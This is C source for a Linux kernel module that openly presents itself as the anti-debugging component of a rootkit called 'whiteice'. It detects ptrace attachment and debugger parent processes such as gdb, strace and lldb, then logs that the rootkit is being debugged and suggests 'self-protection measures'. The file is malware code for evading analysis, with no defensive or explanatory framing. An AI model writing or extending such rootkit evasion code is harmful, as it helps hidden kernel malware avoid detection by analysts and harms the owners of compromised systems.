#include "defs.h"
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/module.h>

static int is_being_debugged(void)
{
    struct task_struct *parent_task = current->real_parent;

    if (current->ptrace) {
        printk(KERN_WARNING "[whiteice:anti_debug] PTRACE detected on PID %d\n", current->pid);
        return 1;
    }

    if (strstr(parent_task->comm, "gdb") ||
        strstr(parent_task->comm, "strace") ||
        strstr(parent_task->comm, "ltrace") ||
        strstr(parent_task->comm, "dbg") ||
        strstr(parent_task->comm, "lldb")) {
        printk(KERN_WARNING "[whiteice:anti_debug] Debugger parent detected: %s (PID %d)\n", parent_task->comm, parent_task->pid);
        return 1;
    }

    return 0;
}

void check_debug_status(void)
{
    if (is_being_debugged()) {
        printk(KERN_ERR "[whiteice:anti_debug] Rootkit is being debugged. Consider self-protection measures.\n");
    }
}
